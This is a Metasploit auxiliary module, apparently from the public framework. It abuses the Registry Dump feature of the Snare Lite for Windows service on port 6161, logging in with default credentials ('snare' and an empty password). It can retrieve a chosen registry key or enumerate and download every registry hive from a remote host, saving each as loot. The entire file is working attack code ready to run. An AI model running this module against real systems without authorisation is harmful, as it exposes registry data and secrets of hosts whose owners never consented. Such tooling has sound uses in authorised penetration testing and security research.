##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  HttpFingerprint = { :pattern => [ /SNARE/ ] }

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Snare Lite for Windows Registry Access',
      'Description'   => %q{
          This module uses the Registry Dump feature of the Snare Lite
        for Windows service on 6161/TCP to retrieve the Windows registry.
        The Dump Registry functionality is unavailable in Snare Enterprise.

        Note: The Dump Registry functionality accepts only one connected
        client at a time. Requesting a large key/hive will cause the service
        to become unresponsive until the server completes the request.
      },
      'Platform'      => 'win',
      'Author'        => [ 'bcoles' ],
      'License'       => MSF_LICENSE,
      'References'    =>
        [
          [ 'URL', 'https://www.intersectalliance.com/wp-content/uploads/user_guides/Guide_to_Snare_for_Windows-4.2.pdf' ]
        ]
    ))

    register_options(
      [
        Opt::RPORT(6161),
        OptString.new('HttpUsername', [ true, 'The username for Snare remote access', 'snare' ]),
        OptString.new('HttpPassword', [ true, 'The password for Snare remote access', '' ]),
        OptString.new('REG_DUMP_KEY', [ false, 'Retrieve this registry key and all sub-keys', 'HKLM\\HARDWARE\\DESCRIPTION\\System' ]),
        OptBool.new('REG_DUMP_ALL', [false, 'Retrieve the entire Windows registry', false]),
        OptInt.new('TIMEOUT', [true, 'Timeout in seconds for downloading each registry key/hive', 300])
      ])
  end

  def run
    datastore['REG_DUMP_ALL'] ? dump_all : dump_key(datastore['REG_DUMP_KEY'])
  end

  #
  # Retrieve the supplied registry key
  #
  def dump_key(reg_key)
    if reg_key.blank?
      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid key name")
    end
    hive = reg_key.split('\\').first
    key = reg_key.split('\\')[1..-1].join('\\\\')
    if hive !~ /\A[A-Z0-9_]+\z/i
      fail_with(Failure::BadConfig, "#{peer} - Please supply a valid key name")
    end
    vars_get = { 'str_Base' => hive }
    if key.eql?('')
      print_status("#{peer} - Retrieving registry hive '#{hive}'...")
    else
      print_status("#{peer} - Retrieving registry key '#{hive}\\\\#{key}'...")
      vars_get['str_SubKey'] = key
    end
    res = send_request_cgi({
      'uri' => normalize_uri('RegDump'),
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
      'vars_get' => vars_get
    }, datastore['TIMEOUT'])
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    elsif res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
    elsif res.code && res.code == 200 && res.body && res.body =~ /\AKEY: /
      print_good("#{peer} - Retrieved key successfully (#{res.body.length} bytes)")
    elsif res.code && res.code == 200 && res.body && res.body =~ /the supplied subkey cannot be found/
      fail_with(Failure::NotFound, "#{peer} - The supplied registry key does not exist")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
    end
    path = store_loot(
      'snare.registry',
      'text/plain',
      datastore['RHOST'],
      res.body,
      reg_key.gsub(/[^\w]/, '_').downcase
    )
    print_good("File saved in: #{path}")
  end

  #
  # Retrieve list of registry hives
  #
  def retrieve_hive_list
    hives = []
    print_status("#{peer} - Retrieving list of registry hives ...")
    res = send_request_cgi(
      'uri' => normalize_uri('RegDump'),
      'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
    )
    if !res
      fail_with(Failure::Unreachable, "#{peer} - Connection failed")
    elsif res.code && res.code == 401
      fail_with(Failure::NoAccess, "#{peer} - Authentication failed")
    elsif res.code && res.code == 404
      fail_with(Failure::NotVulnerable, "#{peer} - Dump Registry feature is unavailable")
    elsif res.code && res.code == 200 && res.body && res.body =~ /RegDump\?str_Base/
      hives = res.body.scan(%r{<li><a href="\/RegDump\?str_Base=([a-zA-Z0-9_]+)">}).flatten
      vprint_good("#{peer} - Found #{hives.length} registry hives (#{hives.join(', ')})")
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Unexpected reply (#{res.body.length} bytes)")
    end
    hives
  end

  #
  # Retrieve all registry hives
  #
  def dump_all
    hives = retrieve_hive_list
    if hives.blank?
      print_error("#{peer} - Found no registry hives")
      return
    end
    hives.each { |hive| dump_key(hive) }
  end
end
